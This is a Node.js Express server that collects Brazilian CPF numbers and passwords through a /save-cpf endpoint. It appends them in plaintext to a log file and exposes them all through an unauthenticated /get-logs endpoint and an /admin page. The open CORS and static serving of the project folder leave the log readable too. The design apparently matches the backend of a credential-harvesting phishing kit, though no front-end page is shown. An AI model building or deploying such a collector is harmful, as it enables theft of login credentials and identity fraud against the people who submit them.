const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');

const app = express();
const PORT = 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('.'));

// Create logs directory if it doesn't exist
const logsDir = path.join(__dirname, 'logs');
if (!fs.existsSync(logsDir)) {
    fs.mkdirSync(logsDir);
}

// Endpoint to save CPF data
app.post('/save-cpf', (req, res) => {
    try {
        const { cpf, password } = req.body;
        const timestamp = new Date().toLocaleString('pt-BR');
        const logEntry = `Data: ${timestamp} | CPF: ${cpf} | Senha: ${password}\n`;
        
        // Save to logs file
        const logFile = path.join(__dirname, 'cpf_logs.txt');
        fs.appendFileSync(logFile, logEntry, 'utf8');
        
        console.log('CPF salvo:', { cpf, password, timestamp });
        
        res.json({ success: true, message: 'Dados salvos com sucesso' });
    } catch (error) {
        console.error('Erro ao salvar CPF:', error);
        res.status(500).json({ success: false, message: 'Erro ao salvar dados' });
    }
});

// Endpoint to get all logs
app.get('/get-logs', (req, res) => {
    try {
        const logFile = path.join(__dirname, 'cpf_logs.txt');
        if (fs.existsSync(logFile)) {
            const logs = fs.readFileSync(logFile, 'utf8');
            res.json({ success: true, logs });
        } else {
            res.json({ success: true, logs: '' });
        }
    } catch (error) {
        console.error('Erro ao ler logs:', error);
        res.status(500).json({ success: false, message: 'Erro ao ler logs' });
    }
});

// Serve the main files
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'admin.html'));
});

// Start server
app.listen(PORT, () => {
    console.log(`Servidor rodando em http://localhost:${PORT}`);
    console.log(`Logs serão salvos em: ${path.join(__dirname, 'cpf_logs.txt')}`);
});
